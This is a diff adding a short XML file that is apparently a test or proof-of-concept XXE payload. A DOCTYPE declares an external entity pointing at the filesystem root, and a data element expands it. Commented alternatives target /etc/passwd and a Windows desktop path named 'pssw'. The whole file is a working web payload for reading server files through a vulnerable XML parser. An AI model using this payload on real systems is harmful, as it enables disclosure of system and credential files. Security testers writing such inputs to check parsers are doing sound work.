@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE model [
+<!ENTITY xxe SYSTEM "file:///">
+]>
+<model>
+    <id>2</id>
+    <data>&xxe;</data>
+    <type>TYPE</type>
+</model>
+<!--        C:\Users\Gleb\Desktop\pssw-->
+<!--        file:///etc/passwd-->
